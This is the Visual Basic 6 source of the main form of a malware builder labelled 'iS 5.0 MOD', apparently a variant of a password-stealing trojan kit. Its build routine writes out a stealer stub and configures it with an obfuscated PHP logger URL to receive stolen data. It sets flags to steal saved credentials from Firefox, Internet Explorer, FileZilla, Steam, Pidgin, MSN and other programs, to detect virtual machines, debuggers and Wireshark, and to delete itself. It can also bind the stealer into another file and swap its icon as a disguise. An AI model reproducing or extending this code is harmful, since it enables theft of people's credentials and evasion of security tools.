VERSION 5.00
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "iS 5.0 MOD"
   ClientHeight    =   5295
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   4335
   BeginProperty Font 
      Name            =   "Arial"
      Size            =   8.25
      Charset         =   0
      Weight          =   700
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   5295
   ScaleWidth      =   4335
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton cmdOptions 
      Caption         =   "Options"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   350
      Left            =   1080
      TabIndex        =   5
      Top             =   4800
      Width           =   855
   End
   Begin VB.CommandButton cmdAbout 
      Caption         =   "About"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   350
      Left            =   3360
      TabIndex        =   6
      Top             =   4800
      Width           =   855
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   1005
      Left            =   120
      Picture         =   "frmMain.frx":058A
      ScaleHeight     =   975
      ScaleWidth      =   4080
      TabIndex        =   7
      TabStop         =   0   'False
      Top             =   120
      Width           =   4110
   End
   Begin VB.CommandButton cmdBuild 
      Caption         =   "Build"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   350
      Left            =   120
      TabIndex        =   4
      Top             =   4800
      Width           =   855
   End
   Begin VB.Frame frameMenu 
      Caption         =   "Php Logger Options"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Index           =   0
      Left            =   120
      TabIndex        =   8
      Top             =   1200
      Width           =   4095
      Begin VB.TextBox txtUrl 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   325
         Left            =   960
         MaxLength       =   99
         TabIndex        =   0
         Text            =   "http://www.something.com/index.php"
         Top             =   240
         Width           =   3045
      End
      Begin VB.Label Label1 
         BackStyle       =   0  'Transparent
         Caption         =   "Url:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   315
         Width           =   855
      End
   End
   Begin VB.Frame frameMenu 
      Caption         =   "Binder Options"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1455
      Index           =   1
      Left            =   120
      TabIndex        =   10
      Top             =   2040
      Width           =   4095
      Begin VB.TextBox txtExtraction 
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   325
         Left            =   960
         MaxLength       =   49
         TabIndex        =   2
         Top             =   960
         Width           =   3045
      End
      Begin VB.CheckBox checkBind 
         Caption         =   "Bind with another file"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   3855
      End
      Begin VB.TextBox txtBind 
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   325
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   11
         TabStop         =   0   'False
         Text            =   "File path ..."
         Top             =   600
         Width           =   3045
      End
      Begin VB.Label Label5 
         BackStyle       =   0  'Transparent
         Caption         =   "Extraction:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   1035
         Width           =   855
      End
      Begin VB.Label Label4 
         BackStyle       =   0  'Transparent
         Caption         =   "Path:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   12
         Top             =   675
         UseMnemonic     =   0   'False
         Width           =   855
      End
   End
   Begin VB.Frame frameMenu 
      Caption         =   "Icon Changer Options"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1095
      Index           =   2
      Left            =   120
      TabIndex        =   13
      Top             =   3600
      Width           =   4095
      Begin VB.CheckBox checkIcon 
         Caption         =   "Change the icon"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   3
         Top             =   240
         Width           =   3855
      End
      Begin VB.TextBox txtIcon 
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   325
         Left            =   960
         Locked          =   -1  'True
         TabIndex        =   14
         TabStop         =   0   'False
         Text            =   "Icon path ..."
         Top             =   600
         Width           =   3015
      End
      Begin VB.Label Label6 
         BackStyle       =   0  'Transparent
         Caption         =   "Path:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   675
         Width           =   855
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Declare Sub InitCommonControls Lib "comctl32" ()
Dim dlgMain As cFileDialog

Private Sub cmdOptions_Click()
    frmOptions.Show 1
End Sub

Private Sub Form_Initialize()
    Set dlgMain = New cFileDialog
    If App.PrevInstance Then End
    InitCommonControls
    Load frmOptions
    Load frmAbout
    CheckHardwareId
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    On Error Resume Next
    Unload frmAbout
    Unload frmOptions
    End
End Sub

Private Sub checkBind_Click()
    If checkBind.Value = 1 Then
        dlgMain.Filter = "All files (*.*)|*.*"
        dlgMain.Filename = ""
        dlgMain.ShowOpen
        If dlgMain.Filename = "" Then
            checkBind.Value = 0
        Else
            If FileLen(dlgMain.Filename) > 26214400 Then
                MsgBox "The file size limit is 25 Mb", vbExclamation
                checkBind.Value = 0
            Else
                txtBind.Text = dlgMain.Filename
                txtBind.Enabled = True
                txtExtraction.Text = GetFileFromPath(dlgMain.Filename)
                txtExtraction.Enabled = True
            End If
        End If
    Else
        txtBind.Text = "File path ..."
        txtBind.Enabled = False
        txtExtraction.Text = ""
        txtExtraction.Enabled = False
    End If
End Sub

Private Sub cmdAbout_Click()
    frmAbout.Show 1
End Sub

Private Sub checkIcon_Click()
    If checkIcon.Value = 1 Then
        dlgMain.Filter = "Icon (*.ico)|*.ico"
        dlgMain.Filename = ""
        dlgMain.ShowOpen
        If dlgMain.Filename = "" Then
            checkIcon.Value = 0
        Else
            txtIcon.Text = dlgMain.Filename
            txtIcon.Enabled = True
        End If
    Else
        txtIcon.Text = "Icon path ..."
        txtIcon.Enabled = False
    End If
End Sub

Private Sub cmdBuild_Click()
    Dim cPath As String, cStub() As Byte, cData As String
    Dim cBindName As String, cBindFile As String, cUpx() As Byte
    Dim serverPath As String

'Comprobamos la configuracion
    If Len(txtUrl.Text) < 15 Then
        MsgBox "Check the php logger configuration!", vbExclamation
        Exit Sub
    End If

'Sino abre el archivo salimos
    dlgMain.Filter = "Executable (*.exe)|*.exe"
    dlgMain.Filename = ""
    dlgMain.ShowSave
    If dlgMain.Filename = "" Then Exit Sub
    serverPath = dlgMain.Filename
    If Right(serverPath, 4) <> ".exe" Then serverPath = serverPath & ".exe"

'Extraemos el stub
    cStub = LoadResData(1, "CUSTOM")
    Open serverPath For Binary As #1
        Put #1, , cStub
    Close #1

'Cambiamos el icono
    If checkIcon.Value = 1 And txtIcon.Text <> "Icon path ..." Then
        If ChangeResIcon(serverPath, txtIcon.Text) = False Then
            MsgBox "The icon has not changed.", vbExclamation
        End If
    End If

'Guardamos la configuracion
    '***********************
    '*isVirtual         (1)
    '*isWireShark       (1)
    '*isOllyDbg         (1)
    '*isProcmon         (1)
    '*isMelt            (1)

    '*isMsnMessenger    (1)
    '*isGoogleTalk      (1)
    '*isTrillian        (1)
    '*isPidgin          (1)
    '*isPaltalk         (1)
    '*isSteam           (1)
    '*isNoIp            (1)
    '*isFirefox         (1)
    '*isInternetExplorer(1)
    '*isFileZilla       (1)

    '*cUrl              (100)

    '*isBind            (1)
    '*cBind             (50)
    '***********************

    cData = String(167, Chr(0))

'General Options
    If frmOptions.checkGeneral(0).Value = 1 Then 'isVirtual
        CopyMemory ByVal StrPtr(cData) + 0, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkGeneral(1).Value = 1 Then 'isWireShark
        CopyMemory ByVal StrPtr(cData) + 2, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkGeneral(2).Value = 1 Then 'isOllyDbg
        CopyMemory ByVal StrPtr(cData) + 4, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkGeneral(3).Value = 1 Then 'isProcmon
        CopyMemory ByVal StrPtr(cData) + 6, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkGeneral(4).Value = 1 Then 'isMelt
        CopyMemory ByVal StrPtr(cData) + 8, ByVal StrPtr(Chr(1)), 2
    End If

'Recovery Options
    If frmOptions.checkRecovery(0).Value = 1 Then 'isMsnMessenger
        CopyMemory ByVal StrPtr(cData) + 10, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(1).Value = 1 Then 'isGoogleTalk
        CopyMemory ByVal StrPtr(cData) + 12, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(2).Value = 1 Then 'isTrillian
        CopyMemory ByVal StrPtr(cData) + 14, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(3).Value = 1 Then 'isPidgin
        CopyMemory ByVal StrPtr(cData) + 16, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(4).Value = 1 Then 'isPaltalk
        CopyMemory ByVal StrPtr(cData) + 18, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(5).Value = 1 Then 'isSteam
        CopyMemory ByVal StrPtr(cData) + 20, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(6).Value = 1 Then 'isNoIp
        CopyMemory ByVal StrPtr(cData) + 22, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(7).Value = 1 Then 'isFirefox
        CopyMemory ByVal StrPtr(cData) + 24, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(8).Value = 1 Then 'isInternetExplorer
        CopyMemory ByVal StrPtr(cData) + 26, ByVal StrPtr(Chr(1)), 2
    End If
    If frmOptions.checkRecovery(9).Value = 1 Then 'isFileZilla
        CopyMemory ByVal StrPtr(cData) + 28, ByVal StrPtr(Chr(1)), 2
    End If

'Php Logger Options
    CopyMemory ByVal StrPtr(cData) + 30, ByVal StrPtr(UnXor2(txtUrl.Text)), Len(txtUrl.Text) * 2

'Binder Options
    If checkBind.Value = 1 And txtBind.Text <> "File path ..." And txtExtraction.Text <> "" Then
        Open txtBind.Text For Binary As #1
            cBindFile = Space(LOF(1))
            Get #1, , cBindFile
        Close #1
        ChangeResData serverPath, 2, cBindFile
        CopyMemory ByVal StrPtr(cData) + 230, ByVal StrPtr(Chr(1)), 2
        CopyMemory ByVal StrPtr(cData) + 232, ByVal StrPtr(UnXor2(txtExtraction.Text)), Len(txtExtraction.Text) * 2
    End If

    ChangeResData serverPath, 1, cData
    
'Anti PADDINGXX
Dim fBuffer() As Byte, rBuffer As String
Dim IDH As IMAGE_DOS_HEADER
Dim INH As IMAGE_NT_HEADERS
Dim ISH As IMAGE_SECTION_HEADER

Open serverPath For Binary As #1
    rBuffer = Space(LOF(1))
    Get #1, , rBuffer

    fBuffer = StrConv(rBuffer, vbFromUnicode)
    CopyMemory IDH, fBuffer(0), Len(IDH)
    CopyMemory INH, fBuffer(IDH.e_lfanew), Len(INH)
    CopyMemory ISH, fBuffer(IDH.e_lfanew + Len(INH) + Len(ISH) * (INH.FileHeader.NumberOfSections - 1)), Len(ISH)

    rBuffer = String(ISH.SizeOfRawData - ISH.VirtualSize, 0)
    Seek #1, ISH.PointerToRawData + ISH.VirtualSize + 1
    Put #1, , rBuffer
Close #1

    MsgBox "Built correctly!", vbInformation
End Sub











